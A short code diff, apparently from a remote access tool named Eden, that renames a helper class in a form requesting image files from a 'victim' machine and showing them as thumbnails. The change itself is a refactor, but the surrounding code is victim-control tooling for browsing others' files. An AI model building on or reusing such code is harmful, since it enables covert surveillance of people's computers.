@@ -30,7 +30,7 @@ namespace Eden
             {
                 if (aMsg[1] == "img")
                 {
-                    List<List<string>> lsResults = Tools.EZData.String2TwoDList(aMsg[2]);
+                    List<List<string>> lsResults = clsTools.EZData.String2TwoDList(aMsg[2]);
                     foreach (var result in lsResults)
                     {
                         string szImgFilename = result[0];
@@ -43,7 +43,7 @@ namespace Eden
                         }
                         else
                         {
-                            Image img = Tools.Base64ToIamge(szMsg);
+                            Image img = clsTools.Base64ToIamge(szMsg);
                             stImageItem st = new stImageItem()
                             {
                                 szFilename = szImgFilename,
@@ -78,7 +78,7 @@ namespace Eden
             listView1.View = View.LargeIcon;
             listView1.LargeImageList = m_ImageList;
 
-            m_clnt.SendVictim(m_szVictimID, "File|img|" + Tools.EZData.OneDList2String(m_lsImgFilename));
+            m_clnt.SendVictim(m_szVictimID, "File|img|" + clsTools.EZData.OneDList2String(m_lsImgFilename));
         }
 
         private void frmFileImage_Load(object sender, EventArgs e)
